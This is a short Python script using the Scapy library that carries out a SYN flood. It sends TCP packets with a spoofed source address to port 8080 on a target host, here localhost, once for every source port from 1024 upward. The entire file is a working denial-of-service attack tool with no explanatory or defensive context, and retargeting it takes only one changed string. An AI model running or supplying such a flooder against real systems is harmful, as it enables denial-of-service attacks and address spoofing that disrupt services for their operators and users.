from scapy.all import send,sr1
from scapy.layers.inet import IP,TCP


def syn_flood(src, tgt):
    for sport in range(1024,65535):
        ip_layer = IP(src=src, dst=tgt)
        tcp_layer = TCP(sport=sport,dport=8080)
        pkt = ip_layer / tcp_layer
        send(pkt)

src = '10.0.0.2'
tgt = '127.0.0.1'
syn_flood(src,tgt)
